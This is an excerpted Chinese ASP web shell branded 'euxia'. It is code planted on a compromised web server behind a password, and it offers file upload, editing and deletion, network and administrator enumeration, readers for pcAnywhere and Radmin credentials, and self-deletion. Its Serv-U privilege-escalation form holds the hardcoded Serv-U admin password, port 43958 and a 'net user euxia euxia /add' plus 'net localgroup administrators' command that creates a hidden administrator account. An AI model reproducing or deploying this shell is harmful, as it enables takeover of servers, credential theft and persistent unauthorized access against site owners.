...
Copyright="技术的精纯及无私的奉献才是我们最大的追求"
UserPass="0001"  '修改密码
BodyColor="#000000"
FontColor="#FF6600"
LinkColor="#CC9933"
...
RRS"</td><td width='140' align='center'><input name='Submit' type='submit' value='GOGO'> <input type='submit' value='刷新' onclick='FileFrame.location.reload()'>" 
...
RRS"<td width='10%'>cif文件: </td><td width='90%'><input name='path' type='text' value='C:\Documents and Settings\All Users\Application Data\\Symantec\pcAnywhere\Citempl.cif' size='80'></td>"
...
Response.write "Pcanywhere Reader ==>Bin提供源码<br><br>"
...
RRS"</td></tr>"
If Sot(0,1)=" ×" Then
RRS"<tr><td height='24'>没有权限</td></tr>"
Else
RRS"<tr><td height=24 onmouseover=""menu1.style.display=''""><b>磁盘文件操作↓↓</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">"
...
RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\Newfile")&""",""NewFolder"")'>→> 新建--目录</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>→> 新建--文本</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=upfile' target='FileFrame'>→> 上传--单一</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=PageUpFile' target='FileFrame'>→> 上传--批量</a></td></tr>"
...
RRS"<tr><td height='22'><a href='?Action=getTerminalInfo' target='FileFrame'>→> 端口__网络</a></td></tr>"
...
RRS"<tr><td height='22'><a href='?Action=adminab' target='FileFrame'>→> 查询管理员</a></td></tr>"
...
RRS"<tr><td height='22'><a href='?Action=Servu' target='FileFrame'>→> Serv_u提权</a></td></tr>"
...
RRS"<tr><td height='22'><a href='?Action=radmin' target='FileFrame'>→> Radmin读取</a></td></tr>"
...
RRS"<tr><td height='22'><a href='?Action=euxia' target='FileFrame' style='color:red'>→> 选择__自杀</a></td></tr>"
...
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=php' target='FileFrame'>→> php___探测</a><br>"
...
RRS"</table>"
End Function
function php():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo '恭喜euxia服务器支持PHP'?><?php phpinfo()?>":Response.write"<iframe src=test.php width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到test.php正常显示,表示支持PHP<p><font color=red否则就是不支持拉!测试完成记得删除！":End function
...
function euxia():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(server.mappath("he1p.asp")):response.write"一路走好!":End function:function sam():Response.write "<br><br><p><br><p><br><br><p><br><center><br><br><font color=red>":response.write"<center><font face=wingdings color=#00EC00 style=font-size:240pt>N</font><span class=style1><span style=font-weight: 300><font face=Impact color=#FFFFFF style=font-size: 100pt></center>":End function
Sub PageAddToMdb()
Dim theAct, thePath
...
StreamUploadup()
RRS "<script>alert('恭喜euxia文件上传成功!');history.back();</script>"
...
End If
chkErr(Err)
RRS("<script language=""javascript"">alert('恭喜euxia文件上传成功!\n"&Replace(fileName, "\", "\\")&"');</script>")
streamT.Close
.Close
End With
Set stream=Nothing
...
SI="<center><br><br><br>恭喜euxia文件"&UName&"上传成功！</center>"
End if
End If
...
If Session("webadministrators")<>UserPass Then
	If Request.Form("LP")<>"" Then
		...
		Else
			response.write"<div align=center><font size='5' color='#00ff00'>euxia友情提示 不是自己的女人别乱骑!!!</font>"
		end if
	else
End If
'=============密码阶段=======================================
...
si="<center><a href='"&SiteURL&"' target='_blank'></a><form action='"&url&"' method='post'>Pass: <input name='Lp' type='password'  size='25'> <input type='submit' value=' 登陆 '><br></div></center>"
...
CF.DeleteFile Path
SI="<center><br><br><br>恭喜euxia文件 "&Path&" 删除成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
...
T.close
Set T=nothing
SI="<center><br><br><br>恭喜euxia文件保存成功！</center>"
if session("IDebugMode") <> "ok" then
response.write""&surl&""
session("IDebugMode")="ok"
end if
...
Set T=Nothing
Else
Path=Session("FolderPath")&"\cmd.asp":Txt="新建文件"
End If
...
SI="<center><br><br><br>恭喜euxia文件"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
RRS SI 
End If
End Function
...
SI="<center><br><br><br>恭喜euxia文件"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
RRS SI 
End If
End Function
...
SI="<center><br><br><br>恭喜euxia目录"&Path&"删除成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
...
SI="<center><br><br><br>恭喜euxia目录"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
...
SI="<center><br><br><br>恭喜euxia目录"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
...
SI="<center><br><br><br>恭喜euxia目录"&Path&"新建成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
...
RRS"<center>添加的用户名:<input name='tuser' type='text' class='TextBox' id='tuser' value='euxia'><br>"
RRS"<center>添加的用户密码:<input name='tpass' type='text' class='TextBox' id='pass' value='euxia'><br>"
...
RRS"<center><br><form method='post' name='goldsun'><table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'><tr align='center' valign='middle'><td colspan='2'>Serv-U 提升权限 ASP版</td></tr><tr align='center' valign='middle'><td width='100'>用户名:</td><td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td></tr><tr align='center' valign='middle'><td>口 令：</td><td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td></tr><tr align='center' valign='middle'><td>端 口：</td><td><input name='port' type='text' id='port' value='43958'></td></tr><tr align='center' valign='middle'><td>系统路径：</td><td><input name='f' type='text' id='f' value='"&f&"' size='8'></td></tr><tr align='center' valign='middle'><td>命　令：</td><td><input name='c' type='text' id='c' value='cmd /c net user euxia euxia /add&net localgroup administrators euxia /add' size='50'></td></tr><tr align='center' valign='middle'><td colspan='2'><input type='submit' name='Submit' value='提交'><input type='reset' name='Submit2' value='重置'><input name='SUaction' type='hidden' id='action' value='1'></td></tr></table></form></center>"
end select
function Gpath()
on error resume next
...
Response.Write "<INPUT type=submit value=生成报告>　指定文件夹路径。如 F:\euxia\</FORM><DIV></table>"
	Set FSO=Nothing
End Sub
